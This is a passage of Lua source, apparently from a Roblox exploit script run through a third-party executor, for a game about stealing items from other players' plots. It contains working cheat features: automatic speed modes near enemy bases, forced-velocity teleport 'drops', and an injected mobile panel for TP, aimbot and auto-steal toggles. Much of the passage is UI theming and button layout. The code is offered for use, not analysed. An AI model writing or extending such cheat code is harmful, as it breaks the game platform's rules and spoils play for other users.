    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
    if M.refreshSpeedModeButtons then M.refreshSpeedModeButtons() end
    if M.refreshSpeedCustomizerFields then M.refreshSpeedCustomizerFields() end
end

function M.stopWalkSpeedAutoSwitch()
    if M._autoSwitchSpeedConn then
        pcall(function() M._autoSwitchSpeedConn:Disconnect() end)
        M._autoSwitchSpeedConn = nil
    end
end

function M.startWalkSpeedAutoSwitch()
    if M._autoSwitchSpeedConn then return end
    M._autoSwitchSpeedConn = RunService.Heartbeat:Connect(function()
        if not M.autoSwitchSpeedEnabled then
            M.stopWalkSpeedAutoSwitch()
            return
        end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local ws = hum.WalkSpeed or 16
        local thr = tonumber(M.AUTO_SWITCH_THRESHOLD) or 25

        -- Auto Carry Speed only
        if M.autoSwitchSpeedEnabled and ws <= thr and not M.carrySpeedActive and not M.laggerCarryActive then
            M.setModeCarryFlags()
        end
    end)
end


function M.isNearEnemyBase(range)
    range = tonumber(range) or M.autoCarryEnemyBaseRange or 35
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local myPos = hrp.Position
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") and not isMyPlot(plot.Name) then
            local pos
            local ok, pivot = pcall(function() return plot:GetPivot().Position end)
            if ok and pivot then pos = pivot
            else
                local sign = plot:FindFirstChild("PlotSign")
                if sign and sign:IsA("BasePart") then pos = sign.Position
                elseif sign then
                    local pp = sign:FindFirstChildWhichIsA("BasePart", true)
                    if pp then pos = pp.Position end
                end
            end
            if pos then
                local flat = Vector3.new(myPos.X - pos.X, 0, myPos.Z - pos.Z)
                if flat.Magnitude <= range then return true end
            end
        end
    end
    return false
end
function M.enableCarryModeOnly()
    if M.carrySpeedActive then return end
    M.carrySpeedActive = true
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry On" end
    if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(true) end) end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
end
function M.startAutoCarryEnemyBase()
    if M._autoCarryEnemyBaseConn then return end
    local acc = 0
    M._autoCarryEnemyBaseConn = RunService.Heartbeat:Connect(function(dt)
        if not M.autoCarryEnemyBaseEnabled then return end
        acc = acc + (dt or 0.016)
        if acc < 0.2 then return end
        acc = 0
        if M.carrySpeedActive then return end
        if M.isNearEnemyBase(M.autoCarryEnemyBaseRange) then M.enableCarryModeOnly() end
    end)
end
function M.stopAutoCarryEnemyBase()
    if M._autoCarryEnemyBaseConn then pcall(function() M._autoCarryEnemyBaseConn:Disconnect() end); M._autoCarryEnemyBaseConn = nil end
end
function M.setAutoCarryEnemyBase(on)
    M.autoCarryEnemyBaseEnabled = on and true or false
    if M.autoCarryEnemyBaseEnabled then M.startAutoCarryEnemyBase() else M.stopAutoCarryEnemyBase() end
    if M.setAutoCarryEnemyBaseVisual then pcall(function() M.setAutoCarryEnemyBaseVisual(M.autoCarryEnemyBaseEnabled) end) end
end
function M.refreshWalkSpeedAutoSwitch()
    if M.autoSwitchSpeedEnabled then
        M.startWalkSpeedAutoSwitch()
    else
        M.stopWalkSpeedAutoSwitch()
    end
end

function M.updateAutoSwitchSpeed()
    -- Steal-based auto carry (existing)
    if M.autoSwitchSpeedEnabled then
        local isSteal = M.isStealState()
        if isSteal ~= M._autoSwitchWasSteal then
            M._autoSwitchWasSteal = isSteal
            local inLagger = M.laggerModeEnabled or M.laggerCarryActive
            if isSteal then
                if inLagger then
                    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
                    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
                    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
                    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
                else
                    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(true) end
                    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
                    if M.carryModeBtn then M.carryModeBtn.Text = "Carry On" end
                    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
                end
            else
                if inLagger then
                    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
                    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
                    if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
                    if M.laggerModeBtn then M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off" end
                    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
                else
                    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
                    if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
                end
            end
            if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
        end
    end
end

function M.isRagdollState(hum)
    if not hum then return true end;local st=hum:GetState()
    return hum.PlatformStand or st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown
end

-- Drop Brainrot (Xray.Vs style — ascend then snap to ground)
M.lastDropTime = M.lastDropTime or 0
M.dropConnections = M.dropConnections or {}

function M.stopDropBrainrot()
    M.dropActive = false
    if M._dropConn then
        pcall(function() M._dropConn:Disconnect() end)
        M._dropConn = nil
    end
    for _, t in ipairs(M.dropConnections or {}) do
        if type(t) == "thread" then
            pcall(task.cancel, t)
        elseif typeof(t) == "RBXScriptConnection" then
            pcall(function() t:Disconnect() end)
        end
    end
    M.dropConnections = {}
    local c = player.Character
    if c then
        local root = c:FindFirstChild("HumanoidRootPart")
        if root then
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end
    end
end

function M.runDrop()
    if M.dropActive then return end
    -- anti accidental: short global debounce
    local now = tick()
    if M._lastDropInvoke and (now - M._lastDropInvoke) < 0.2 then return end
    M._lastDropInvoke = now
    -- allow drop during semi/auto steal (user must be able to drop brainrot)
    -- only block while TP bat is locking movement
    if M.bypassAimbotEnabled then return end
    pcall(function() M.stopAutoTPForAction() end)
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    M.dropActive = true
    local startTime = tick()
    local dropConn
    dropConn = RunService.Heartbeat:Connect(function()
        local currentChar = player.Character
        local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
        if not currentChar or not currentRoot then
            if dropConn then pcall(function() dropConn:Disconnect() end) end
            M.dropActive = false
            return
        end
        if tick() - startTime >= (tonumber(M.DROP_ASCEND_DURATION) or 0.2) then
            if dropConn then pcall(function() dropConn:Disconnect() end) end
            local rayParams = RaycastParams.new()
            rayParams.FilterDescendantsInstances = {currentChar}
            rayParams.FilterType = Enum.RaycastFilterType.Exclude
            local rayResult = workspace:Raycast(currentRoot.Position, Vector3.new(0, -2000, 0), rayParams)
            if rayResult then
                local hum = currentChar:FindFirstChildOfClass("Humanoid")
                local offset = (hum and hum.HipHeight or 2) + (currentRoot.Size.Y / 2)
                currentRoot.CFrame = CFrame.new(currentRoot.Position.X, rayResult.Position.Y + offset, currentRoot.Position.Z)
                    * CFrame.Angles(0, select(2, currentRoot.CFrame:ToEulerAnglesYXZ()), 0)
                currentRoot.AssemblyLinearVelocity = Vector3.zero
                currentRoot.AssemblyAngularVelocity = Vector3.zero
            end
            M.dropActive = false
            return
        end
        -- Xray.Vs: push upward during ascend window
        local v = currentRoot.AssemblyLinearVelocity
        local up = tonumber(M.DROP_ASCEND_SPEED) or 150
        pcall(function()
            currentRoot.AssemblyLinearVelocity = Vector3.new(v.X, up, v.Z)
            currentRoot.Velocity = Vector3.new(v.X, up, v.Z)
        end)
    end)
    task.delay(1.0, function()
        if M.dropActive then
            M.dropActive = false
            if dropConn then pcall(function() dropConn:Disconnect() end) end
        end
    end)
end

M.runDropBrainrot = M.runDrop

function M.executeDropWithToggle(setVisual)
    if M.dropActive then return end
    task.spawn(function()
        if setVisual then pcall(setVisual, true) end
        M.runDrop()
        while M.dropActive do task.wait() end
        task.wait(0.1)
        if setVisual then pcall(setVisual, false) end
    end)
end

function M.stopAutoTPForAction()
    if M.autoTPEnabled then
        M.stopAutoTP()
        pcall(function() if M.setAutoTPVisual then M.setAutoTPVisual(false) end end)
        pcall(function() if M.saveConfig then M.saveConfig() end end)
    end
end


local function setupDeathReset()
    -- Insta reset on death completely removed
    if M._deathResetConn then
        pcall(function() M._deathResetConn:Disconnect() end)
        M._deathResetConn = nil
    end
    M.autoResetOnDeath = false
end

function M.startRemoveAcc()
    if M.removeAccEnabled then return end
    M.removeAccEnabled = true
    local function removeAccDo()
        if not M.removeAccEnabled then return end
        local char = player.Character
        if not char then return end
        for _,obj in ipairs(char:GetDescendants()) do
            if obj:IsA("Accessory") or obj:IsA("Hat") then
                if not M.removedAccessories[obj] then
                    M.removedAccessories[obj] = true
                    pcall(function() obj:Destroy() end)
                end
            end
        end
    end
    removeAccDo()
    M.removeAccConn = player.CharacterAdded:Connect(function()
        task.wait(0.5)
        if M.removeAccEnabled then removeAccDo() end
    end)
end

function M.stopRemoveAcc()
    M.removeAccEnabled = false
    if M.removeAccConn then
        M.removeAccConn:Disconnect()
        M.removeAccConn = nil
    end
    M.removedAccessories = {}
end

-- ============================================================
-- MOBILE BUTTONS (trascinabili singolarmente)
-- ============================================================
function M.destroyMobileButtons()
    if M.mobGuiRef then
        pcall(function() M.mobGuiRef:Destroy() end)
        M.mobGuiRef = nil
    end
    for _,n in ipairs({"MoveeMobileButtons"}) do
        local old = game:GetService("CoreGui"):FindFirstChild(n); if old then old:Destroy() end
        local pgui = player:FindFirstChild("PlayerGui"); if pgui then local o = pgui:FindFirstChild(n); if o then o:Destroy() end end
    end
    M.mobBtnRefs = {}
    M.mobBtnFrames = {}
end

function M.loadBtnPositions()
    local out = {}
    -- Primary: dedicated positions file
    if isfile and isfile(M.MOB_POS_FILE) then
        local ok, data = pcall(function() return HS:JSONDecode(readfile(M.MOB_POS_FILE)) end)
        if ok and type(data) == "table" then
            for k, v in pairs(data) do
                if type(v) == "table" then
                    out[k] = v
                end
            end
        end
    end
    -- Backup: CherryConfig.btnPos
    if M._btnPosCache and type(M._btnPosCache) == "table" then
        for k, v in pairs(M._btnPosCache) do
            if not out[k] and type(v) == "table" and type(v.x) == "number" and type(v.y) == "number" then
                out[k] = {x = v.x, y = v.y}
            end
        end
    end
    return out
end

function M.saveBtnPositions()
    if not M.mobGuiRef or not M.mobGuiRef.Parent then return end
    local out = {}
    -- Prefer explicit frame map (Green Duels stack)
    if M.mobBtnFrames then
        for key, child in pairs(M.mobBtnFrames) do
            if child and child.Parent then
                out[key] = {
                    x = child.AbsolutePosition.X,
                    y = child.AbsolutePosition.Y,
                    sx = child.Position.X.Scale,
                    sy = child.Position.Y.Scale,
                    ox = child.Position.X.Offset,
                    oy = child.Position.Y.Offset,
                }
            end
        end
    end
    for _, child in ipairs(M.mobGuiRef:GetChildren()) do
        local key = child:GetAttribute("BtnKey")
        if key and not out[key] then
            out[key] = {
                x = child.AbsolutePosition.X,
                y = child.AbsolutePosition.Y,
                sx = child.Position.X.Scale,
                sy = child.Position.Y.Scale,
                ox = child.Position.X.Offset,
                oy = child.Position.Y.Offset,
            }
        end
    end
    M._btnPosCache = out
    if writefile then
        pcall(function() writefile(M.MOB_POS_FILE, HS:JSONEncode(out)) end)
    end
    -- Also persist via main config when available
    pcall(function()
        if saveCherryConfig then saveCherryConfig() end
    end)
end

function M.resetPanelPositions()
    M.pingPanelPos = nil
    M.aadPanelPos = nil
    M.killLaggerPanelPos = nil
    local pingDefault = UDim2.new(0.5, -160, 0.25, 0)
    local aadDefault = UDim2.new(0.5, -150, 0.4, 0)
    local lagDefault = UDim2.new(0.5, -150, 0.15, 0)
    pcall(function()
        if M.pingMain and M.pingMain.Parent then M.pingMain.Position = pingDefault end
    end)
    pcall(function()
        if M.aadMain and M.aadMain.Parent then M.aadMain.Position = aadDefault end
    end)
    pcall(function()
        if M.killLaggerMain and M.killLaggerMain.Parent then M.killLaggerMain.Position = lagDefault end
    end)
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.resetMobilePositions()
    -- Clear saved mobile + auto-grab UI positions
    M.stealBarPos = nil
    pcall(function()
        if M.statusHolder then
            local barW = math.max(tonumber(M.stealBarSize) or 320, 300)
            M.statusHolder.Position = UDim2.new(0.5, -math.floor(barW / 2), 1, -60)
        end
    end)
    pcall(saveCherryConfig)
    -- Clear saved positions (os.remove often missing in executors)
    pcall(function()
        if type(delfile) == "function" then
            delfile(M.MOB_POS_FILE)
        elseif type(writefile) == "function" then
            writefile(M.MOB_POS_FILE, "{}")
        end
    end)
    pcall(function()
        if isfile and isfile(M.MOB_POS_FILE) and type(writefile) == "function" then
            writefile(M.MOB_POS_FILE, "{}")
        end
    end)
    M._forceDefaultMobPos = true
    M.buildMobileButtons()
    M._forceDefaultMobPos = false
    -- Snap any leftover to defaults again after build
    pcall(function()
        if not M.mobGuiRef then return end
        local out = {}
        for _, child in ipairs(M.mobGuiRef:GetDescendants()) do
            if child:IsA("TextButton") and child:GetAttribute("BtnKey") then
                local key = child:GetAttribute("BtnKey")
                local dx = child:GetAttribute("DefaultX")
                local dy = child:GetAttribute("DefaultY")
                if typeof(dx) == "number" and typeof(dy) == "number" then
                    child.Position = UDim2.new(0, dx, 0, dy)
                    out[key] = {x = dx, y = dy}
                end
            end
        end
        if writefile then
            writefile(M.MOB_POS_FILE, HS:JSONEncode(out))
        end
    end)
end


-- Apply chosen UI colour + bg image tint to live mobile buttons

function M.getThemeAccent()
    local a = UI_ACCENT or CHERRY_ACCENT
    if typeof(a) == "Color3" then return a end
    local n = tostring(M.colorScheme or M._savedTheme or "")
    if n == "Purple" or n == "Light Purple" then return Color3.fromRGB(140, 35, 210) end
    return Color3.fromRGB(255, 255, 255)
end
function M.isPurpleTheme()
    local n = tostring(M.colorScheme or M._savedTheme or "")
    return n == "Purple" or n == "Light Purple"
end
function M.refreshVynxBrandColors()
    local col = M.getThemeAccent()
    local char = player.Character
    if char then
        for _, d in ipairs(char:GetDescendants()) do
            if d:IsA("TextLabel") and (d.Text == "XIM" or (d.Parent and (d.Parent.Name == "VynxBellyTag" or d.Parent.Name == "VynxPantsTag" or d.Parent.Name == "VynxHatLabel"))) then
                pcall(function() d.TextColor3 = col end)
            end
        end
    end
    if M.mobGuiRef then
        for _, d in ipairs(M.mobGuiRef:GetDescendants()) do
            if d:IsA("TextLabel") and d.Text == "XIM" then
                pcall(function() d.TextColor3 = col end)
            end
        end
    end
    if M.statusStealLbl then pcall(function() end) end
end


function M.isNearRed(c, threshold)
    if typeof(c) ~= "Color3" then return false end
    local r, g, b = c.R, c.G, c.B
    -- any reddish / pink-red used in old UI
    if r > 0.35 and r > g + 0.08 and r > b + 0.08 and g < 0.55 and b < 0.55 then return true end
    if r > 0.5 and g < 0.4 and b < 0.4 then return true end
    return false
end


function M.forceThemeNoRed()

local accent = UI_ACCENT or (M.getThemeAccent and M.getThemeAccent()) or Color3.fromRGB(255, 255, 255)
    local isPurple = M.isPurpleTheme and M.isPurpleTheme() or false
    if not isPurple then
        -- still recolor accents for red theme consistency
        if M.recolorLiveAccents then M.recolorLiveAccents() end
        if M.forceThemeNoRed then M.forceThemeNoRed() end
        return
    end
    if M.recolorLiveAccents then M.recolorLiveAccents() end
    local roots = {}
    for _, g in ipairs({M.mainFrame, M.gui, M.mobGuiRef, M.statusGui, M.bypassPanelGui, M.pingGui, M.killLaggerGui, M.topBannerGui}) do
        if g then table.insert(roots, g) end
    end
    for _, rt in ipairs(roots) do
        if not rt then continue end
        for _, d in ipairs(rt:GetDescendants()) do
            if d:IsA("GuiObject") then
                pcall(function()
                    if M.isNearRed and M.isNearRed(d.BackgroundColor3) then
                        d.BackgroundColor3 = accent
                    end
                end)
            end
            if d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox") then
                pcall(function()
                    if M.isNearRed and M.isNearRed(d.TextColor3) then
                        d.TextColor3 = accent
                    end
                end)
            end
            if d:IsA("UIStroke") then
                pcall(function()
                    if M.isNearRed and M.isNearRed(d.Color) then
                        d.Color = accent
                    end
                end)
            end
        end
    end
end

function M.recolorLiveAccents(root)
    local accent = UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(255, 255, 255)
    local dim = UI_ACCENT_DIM or accent:Lerp(Color3.new(0,0,0), 0.35)
    local roots = {}
    if root then table.insert(roots, root) end
    if M.mainFrame then table.insert(roots, M.mainFrame) end
    if M.gui and M.gui ~= M.mainFrame then table.insert(roots, M.gui) end
    if M.mobGuiRef then table.insert(roots, M.mobGuiRef) end
    if M.statusGui then table.insert(roots, M.statusGui) end
    if M.bypassPanelGui then table.insert(roots, M.bypassPanelGui) end
    if M.pingGui then table.insert(roots, M.pingGui) end
    local seen = {}
    for _, rt in ipairs(roots) do
        if rt and rt.Parent and not seen[rt] then
            seen[rt] = true
            for _, d in ipairs(rt:GetDescendants()) do
                -- tagged theme accents
                if d:GetAttribute("ThemeAccent") then
                    if d:IsA("TextLabel") or d:IsA("TextButton") then
                        pcall(function() d.TextColor3 = accent end)
                    end
                    if d:IsA("Frame") or d:IsA("TextButton") then
                        -- only if visible accent bar / not fully transparent
                        pcall(function()
                            if d.BackgroundTransparency < 0.95 then
                                d.BackgroundColor3 = accent
                            end
                        end)
                    end
                end
                if d:GetAttribute("ThemeChip") then
                    if d:IsA("Frame") or d:IsA("TextButton") then
                        local active = d:GetAttribute("ChipActive")
                        if active == false then
                            -- leave inactive chips light gray
                        else
                            pcall(function() d.BackgroundColor3 = accent end)
                        end
                    end
                end
                if d:GetAttribute("ThemeToggle") and d:IsA("GuiObject") then
                    -- if currently "on" (knob on right-ish) keep accent
                    pcall(function()
                        local knob = d:FindFirstChildOfClass("Frame")
                        if knob and knob.Position.X.Scale >= 0.5 then
                            d.BackgroundColor3 = accent
                        end
                    end)
                end
                -- section labels by name
                if d.Name == "SectionLabel" and d:IsA("TextLabel") then
                    pcall(function() d.TextColor3 = accent end)
                end
                if d.Name == "SectionBar" and d:IsA("Frame") then
                    pcall(function() d.BackgroundColor3 = accent end)
                end
                if d.Name == "VynxChip" and d:IsA("Frame") then
                    pcall(function() d.BackgroundColor3 = accent end)
                end
                if d.Name == "NumBox" and d:IsA("TextBox") then
                    pcall(function() d.TextColor3 = accent end)
                end
                if d:IsA("TextBox") and d:GetAttribute("ThemeAccent") then
                    pcall(function() d.TextColor3 = accent end)
                end
                if d.Name == "AccentBar" and d:IsA("Frame") then
                    pcall(function()
                        if d.BackgroundTransparency < 0.9 then d.BackgroundColor3 = accent end
                    end)
                end
                if d.Name == "ToggleTrack" and d:IsA("GuiObject") then
                    pcall(function()
                        local knob = d:FindFirstChildOfClass("Frame")
                        -- knob on right OR already reddish = ON
                        local on = false
                        if knob and (knob.Position.X.Scale >= 0.5 or knob.Position.X.Offset > 10) then on = true end
                        if on or M.isNearRed(d.BackgroundColor3) then
                            d.BackgroundColor3 = accent
                        end
                    end)
                end
                -- heuristic: near-red backgrounds become accent (toggles on, chips, bars)
                if d:IsA("GuiObject") and not d:IsA("ImageLabel") then
                    local ok, col = pcall(function() return d.BackgroundColor3 end)
                    if ok and M.isNearRed(col) then
                        -- skip pure white/black-ish large panels
                        local name = d.Name or ""
                        if name ~= "Main" and name ~= "MainFrame" and name ~= "ContentRoot" and name ~= "Dim" then
                            pcall(function() d.BackgroundColor3 = accent end)
                        end
                    end
                end
                if d:IsA("TextLabel") or d:IsA("TextButton") then
                    local ok, col = pcall(function() return d.TextColor3 end)
                    if ok and M.isNearRed(col) then
                        pcall(function() d.TextColor3 = accent end)
                    end
                end
                if d:IsA("UIStroke") then
                    local ok, col = pcall(function() return d.Color end)
                    if ok and M.isNearRed(col) then
                        pcall(function() d.Color = accent end)
                    end
                end
            end
        end
    end
end

function M.refreshMobileButtonTheme()
    if not M.mobGuiRef or not M.mobGuiRef.Parent then return end
    local accent = UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(255, 255, 255)
    local dim = UI_ACCENT_DIM or accent:Lerp(Color3.new(0,0,0), 0.4)
    for _, d in ipairs(M.mobGuiRef:GetDescendants()) do
        if d.Name == "VynxChip" and d:IsA("Frame") then
            d.BackgroundColor3 = accent
        end
        if d:IsA("UIStroke") and (d.Name == "BtnStroke" or (d.Parent and d.Parent:GetAttribute("MB_On"))) then
            -- keep stroke accent
            local par = d.Parent
            if par and par:GetAttribute("MB_On") then
                d.Color = accent
            end
        end
    end
    local offTop = M.themeDarkFromAccent(accent, 0.28)
    local offBot = M.themeDarkFromAccent(accent, 0.10)
    for _, child in ipairs(M.mobGuiRef:GetDescendants()) do
        if child:IsA("ImageLabel") and child.Name == "BtnBgImage" then
            child.ImageColor3 = Color3.fromRGB(255, 255, 255) -- no red tint on bg image
        end
        if child:IsA("UIStroke") and (child.Name == "BtnStroke" or child.Parent and child.Parent:IsA("TextButton")) then
            local btn = child.Parent
            local on = btn and btn:GetAttribute("MB_On") == true
            if on then
                child.Color = accent
                child.Transparency = 0
                child.Thickness = 2
            else
                child.Color = dim
                child.Transparency = 0.25
                child.Thickness = 1.5
            end
        end
        if child:IsA("UIGradient") and child.Name == "BtnGrad" then
            local btn = child.Parent
            local on = btn and btn:GetAttribute("MB_On") == true
            if on then
                child.Color = ColorSequence.new(accent:Lerp(Color3.new(1,1,1), 0.35), accent)
            else
                child.Color = ColorSequence.new(offTop, offBot)
            end
        end
        if child:IsA("UIGradient") and child.Parent and child.Parent.Name:find("MobCont_", 1, true) then
            child.Color = ColorSequence.new(offTop, offBot)
        end
        if child:IsA("UIStroke") and child.Parent and child.Parent.Name:find("MobCont_", 1, true) then
            child.Color = dim
        end
    end
    -- Re-apply setOn visuals for each known ref
    for key, setOn in pairs(M.mobBtnRefs or {}) do
        if type(setOn) == "function" then
            -- preserve current on state via attribute if possible
            pcall(function()
                local cont = M.mobGuiRef:FindFirstChild("MobCont_" .. key)
                local btn = cont and cont:FindFirstChild("Btn_" .. key)
                if btn then
                    setOn(btn:GetAttribute("MB_On") == true)
                end
            end)
        end
    end
end


-- Reusable white dots for black UI surfaces (menu, mini pill, mobile buttons)
function M.placeDotsOn(target, count, cornerR, seed)
    if not target then return end
    local old = target:FindFirstChild("DotPattern")
    if old then pcall(function() old:Destroy() end) end
    local dots = Instance.new("Frame")
    dots.Name = "DotPattern"
    dots.BackgroundTransparency = 1
    dots.Size = UDim2.fromScale(1, 1)
    dots.ZIndex = (target.ZIndex or 1)
    dots.ClipsDescendants = true
    dots.Parent = target
    Instance.new("UICorner", dots).CornerRadius = UDim.new(0, cornerR or 12)
    local rng = Random.new(tonumber(seed) or 42)
    count = tonumber(count) or 24
    for i = 1, count do
        local d = Instance.new("Frame")
        d.Name = "Dot"
        local sz = rng:NextNumber(0.6, 1.8)
        d.Size = UDim2.new(0, sz, 0, sz)
        d.Position = UDim2.new(rng:NextNumber(0.04, 0.96), 0, rng:NextNumber(0.08, 0.92), 0)
        d.AnchorPoint = Vector2.new(0.5, 0.5)
        d.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        d.BackgroundTransparency = rng:NextNumber(0.50, 0.88)
        d.BorderSizePixel = 0
        d.ZIndex = dots.ZIndex
        d.Parent = dots
        Instance.new("UICorner", d).CornerRadius = UDim.new(1, 0)
    end
end


function M.refreshOriginalModeMobileButtons()
    local show = (M.speedUIMode or "Original") == "Original"
    local keys = {"carrySpeed", "lagger", "laggerCarry"}
    if M.mobBtnFrames then
        for _, k in ipairs(keys) do
            local f = M.mobBtnFrames[k]
            if f and f.Parent then
                pcall(function() f.Visible = show end)
            end
        end
    end
end

function M.buildMobileButtons()
    M.destroyMobileButtons()
    if not M.mobileButtonsEnabled then return end

    local LAYOUT_VER = 8
    -- Keep dragged positions across rejoin. Only reset when layout version changes.
    if M._mobLayoutVer == nil then
        M._mobLayoutVer = LAYOUT_VER
    elseif M._mobLayoutVer ~= LAYOUT_VER then
        M._mobLayoutVer = LAYOUT_VER
        M._forceDefaultMobPos = true
        pcall(function()
            if type(writefile) == "function" then writefile(M.MOB_POS_FILE, "{}") end
        end)
        M._btnPosCache = {}
    end

    local savedPositions
    if M._forceDefaultMobPos then
        savedPositions = {}
        M._forceDefaultMobPos = false
    else
        savedPositions = (M.loadBtnPositions and M.loadBtnPositions() or {})
    end

    -- 2-column grid:
    -- Auto left | Auto right
    -- TP bat    | Bat aimbot
    -- Drop      | TP down
    -- Lagger    | Carry
    -- Default visual size 55x55 at mobileButtonsSize=55
    local BTN_W, BTN_H, BTN_GAP, COLS = 55, 55, 7, 2
    local scale = math.max(0.5, math.min(1.5, (tonumber(M.mobileButtonsSize) or 60) / 55))
    BTN_W = math.floor(55 * scale)
    BTN_H = math.floor(55 * scale)
    BTN_GAP = math.floor(7 * scale)

    local mobGui = Instance.new("ScreenGui")
    mobGui.Name = "MoveeMobileButtons"
    mobGui.ResetOnSpawn = false
    mobGui.DisplayOrder = 100
    mobGui.IgnoreGuiInset = true
    mobGui.Enabled = true
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(mobGui) end end)
    if not pcall(function() mobGui.Parent = game:GetService("CoreGui") end) then
        mobGui.Parent = player:WaitForChild("PlayerGui")
    end
    M.mobGuiRef = mobGui
    M.mobBtnRefs = M.mobBtnRefs or {}
    M.mobBtnFrames = {}

    -- Solid black / white (TS-style, like screenshot)
    -- OFF = black bg + white text; ON / pressed = white bg + black text
    local C = {
        stackBg = Color3.fromRGB(0, 0, 0),
        stackBrd = Color3.fromRGB(40, 40, 40),
        stackTxt = Color3.fromRGB(255, 255, 255),
        stackActBg = Color3.fromRGB(0, 0, 0),
        stackActBrd = Color3.fromRGB(255, 255, 255),
        stackActTxt = Color3.fromRGB(255, 255, 255),
        stackPressBg = Color3.fromRGB(0, 0, 0),
        stackPressTxt = Color3.fromRGB(255, 255, 255),
    }

    -- User layout (2 columns)
    -- LEFT only: Insta Reset + L.Carry
    -- RIGHT: Auto L/R and everything else
    local stackDefs = {
        {key = "reset",        label = "INSTA\nRESET",  toggle = false, side = "left",  row = 0},
        {key = "laggerCarry",  label = "L.CARRY",       toggle = true,  side = "left",  row = 1},
        {key = "autoLeft",     label = "AUTO\nLEFT",    toggle = true,  side = "right", col = 0, row = 0},
        {key = "autoRight",    label = "AUTO\nRIGHT",   toggle = true,  side = "right", col = 1, row = 0},
        {key = "bypass",       label = "TP BAT",        toggle = true,  side = "right", col = 0, row = 1},
        {key = "autoBat",      label = "BAT\nAIMBOT",   toggle = true,  side = "right", col = 1, row = 1},
        {key = "drop",         label = "DROP",          toggle = false, side = "right", col = 0, row = 2},
        {key = "tpDown",       label = "TP DOWN",       toggle = false, side = "right", col = 1, row = 2},
        {key = "lagger",       label = "LAGGER\nMODE",  toggle = true,  side = "right", col = 0, row = 3},
        {key = "carrySpeed",   label = "CARRY\nSPEED",  toggle = true,  side = "right", col = 1, row = 3},
    }
    COLS = 2

    local function getDefaultStackPos(i)
        local def = stackDefs[i]
        local rightCols = 2
        local totalRows = 4
        local rightW = rightCols * (BTN_W + BTN_GAP) - BTN_GAP
        local gridH = totalRows * (BTN_H + BTN_GAP) - BTN_GAP
        local margin = 14
        local gapLeft = BTN_GAP + 6
        if def.side == "left" then
            local leftX = -(rightW + margin + BTN_W + gapLeft)
            local row = def.row or 0
            return UDim2.new(1, leftX, 0.5, -gridH / 2 + row * (BTN_H + BTN_GAP))
        else
            local col = def.col or 0
            local row = def.row or 0
            return UDim2.new(
                1, -(rightW + margin) + col * (BTN_W + BTN_GAP),
                0.5, -gridH / 2 + row * (BTN_H + BTN_GAP)
            )
        end
    end

    for i, def in ipairs(stackDefs) do
        local key = def.key
        local btnFrame = Instance.new("TextButton")
        btnFrame.Name = "StackBtn_" .. key
        btnFrame.Size = UDim2.new(0, BTN_W, 0, BTN_H)
        local saved = savedPositions and savedPositions[key]
        if saved and type(saved.sx) == "number" and type(saved.sy) == "number" then
            btnFrame.Position = UDim2.new(saved.sx, tonumber(saved.ox) or 0, saved.sy, tonumber(saved.oy) or 0)
        elseif saved and type(saved.ox) == "number" and type(saved.oy) == "number" then
            btnFrame.Position = UDim2.new(tonumber(saved.sx) or 0, saved.ox, tonumber(saved.sy) or 0, saved.oy)
        elseif saved and type(saved.x) == "number" and type(saved.y) == "number" then
            btnFrame.Position = UDim2.new(0, saved.x, 0, saved.y)
        else
            btnFrame.Position = getDefaultStackPos(i)
        end
        btnFrame.BackgroundColor3 = C.stackBg
        btnFrame.BackgroundTransparency = 0
        btnFrame.BorderSizePixel = 0
        btnFrame.AutoButtonColor = false
        btnFrame.Text = def.label
        btnFrame.TextColor3 = C.stackTxt
        btnFrame.TextScaled = false
        btnFrame.TextSize = math.max(9, math.floor(11 * scale))
        btnFrame.Font = Enum.Font.GothamBold
        btnFrame.TextWrapped = true
        btnFrame.LineHeight = 1.2
        btnFrame.ZIndex = 15
